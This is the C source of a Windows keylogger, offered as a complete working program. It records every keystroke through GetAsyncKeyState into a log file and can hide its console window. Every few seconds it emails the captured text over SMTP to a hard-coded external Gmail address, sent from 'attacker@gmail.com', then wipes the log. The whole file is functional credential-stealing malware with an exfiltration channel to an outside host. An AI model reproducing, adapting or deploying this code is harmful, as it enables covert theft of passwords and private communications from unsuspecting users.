#include <stdio.h>
#include <windows.h>
#include <time.h>

// Set to 1 to make the console invisible (0 - False, 1 - True).
#define INVISIBLE_CONSOLE 0

// Set to 1 to suppress console output (0 - False, 1 - True).
#define SILENT_CONSOLE 0    

// Time interval in seconds to check for key presses.
#define LISTENER_TIMER 5    

// Sleep time in milliseconds between sending data.
#define SENDER_SLEEP_TIME 100 

// Name of the log file.
#define FILE_NAME ".txt" 

// Email sender defines:
#define GMAIL_SERVER "gmail-smtp-in.l.google.com"
#define EMAIL_FROM "attacker@gmail.com"
#define EMAIL_TO "toothless5143@gmail.com"

void verifyStealthMode();
void savePressedKey(char pressedKey, char fileName[]);
int getPressedKeyBetweenASCII(int ASCIIValue1, int ASCIIValue2);
int getFileLength(char fileName[]);
char* getBufferFromFile(char fileName[]);
void overrideFile(char fileName[]);
void sendData(SOCKET socket, char data[]);
void sendEmail(char server[], char from[], char to[], char buffer[]);

// Function to verify and set stealth mode.
void verifyStealthMode() {
    if (INVISIBLE_CONSOLE) {
        HWND stealth;
        AllocConsole();
        stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0);
    }
}

// Function to save the pressed key to the log file.
void savePressedKey(char pressedKey, char fileName[]) {
    FILE* file = fopen(fileName, "a+");

    fputc(pressedKey, file);
    fclose(file);
}

// Function to get the ASCII value of the pressed key between the specified range.
int getPressedKeyBetweenASCII(int ASCIIValue1, int ASCIIValue2) {
    int pressedKey = 0;

    for (int character = ASCIIValue1; character <= ASCIIValue2; character++) {
        if (GetAsyncKeyState(character) == -32767) {
            pressedKey = character;
        }
    }

    return pressedKey;
}

// Function to get the file length in bytes.
int getFileLength(char fileName[]) {
    FILE* file = fopen(fileName, "rb");

    fseek(file, 0, SEEK_END);

    int fileLength = ftell(file);

    fclose(file);

    return fileLength;
}

// Function to read the file contents into a buffer.
char* getBufferFromFile(char fileName[]) {
    FILE* file = fopen(fileName, "rb");

    int fileLength = getFileLength(fileName);

    char* buffer = (char*)malloc(fileLength + 1);

    fread(buffer, sizeof(char), fileLength, file);

    buffer[fileLength] = '\0';

    fclose(file);

    return buffer;
}

// Function to override the contents of the file.
void overrideFile(char fileName[]) {
    FILE* file = fopen(fileName, "w");

    fclose(file);
}

int main() {
    verifyStealthMode();

    clock_t timer;
    clock_t now = clock();

    while (1) {
        int pressedKey = getPressedKeyBetweenASCII(8, 255);

        if (pressedKey) {
            savePressedKey(pressedKey, FILE_NAME);

            now = clock();
        }

        timer = (clock() - now) / CLOCKS_PER_SEC;

        if (timer > LISTENER_TIMER) {
            int fileLength = getFileLength(FILE_NAME);

            if (fileLength > 0) {
                sendEmail(GMAIL_SERVER, EMAIL_FROM, EMAIL_TO, getBufferFromFile(FILE_NAME));

                overrideFile(FILE_NAME);
            }

            now = clock();
        } else if (!SILENT_CONSOLE) {
            system("cls");
            printf("Listening...");
            printf("\nTime to send next buffer: %ld\n\n", (LISTENER_TIMER - timer));
        }
    }

    return 0;
}

void sendData(SOCKET sock, char data[]) {
    send(sock, data, strlen(data), 0);
    Sleep(SENDER_SLEEP_TIME);

    if (!SILENT_CONSOLE)
        printf("\n%s", data);
}

void sendEmail(char server[], char from[], char to[], char buffer[]) {
    SOCKET sock;
    WSADATA wsaData;
    struct hostent* host;
    struct sockaddr_in dest;

    char data[3000];

    // Get socket and destination:
    WSAStartup(0x202, &wsaData);

    host = gethostbyname(server);

    memset(&dest, 0, sizeof(dest));
    memcpy(&(dest.sin_addr), host->h_addr, host->h_length);

    dest.sin_family = host->h_addrtype;
    dest.sin_port = htons(25);

    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Connect:
    connect(sock, (struct sockaddr*)&dest, sizeof(dest));
    Sleep(SENDER_SLEEP_TIME);

   // Send data packets, such as:
    // HELO ip.test.com
    // MAIL FROM: <from@gmail.com>
    // RCPT TO: <to@gmail.com>
    // DATA
    // TO: from@gmail.com
    // FROM: to@gmail.com
    // SUBJECT: Keylogger
    // This is a test email from the keylogger.
    // .
    sprintf(data, "HELO me.somepalace.com\n");
    sendData(sock, data);

    sprintf(data, "MAIL FROM: <%s>\n", from);
    sendData(sock, data);

    sprintf(data, "RCPT TO: <%s>\n", to);
    sendData(sock, data);

    sprintf(data, "DATA\n");
    sendData(sock, data);

    sprintf(data, "TO: %s\nFROM: %s\nSUBJECT: Keyloggy\n%s\r\n.\r\n", to, from, buffer);
    sendData(sock, data);

    sprintf(data, "QUIT\n");
    sendData(sock, data);

    if (!SILENT_CONSOLE) {
        printf("\nAll packets have been sent!");
        Sleep(5000);
        system("cls");
    }

    // Close socket and cleanup WSA:
    closesocket(sock);
    WSACleanup();
}
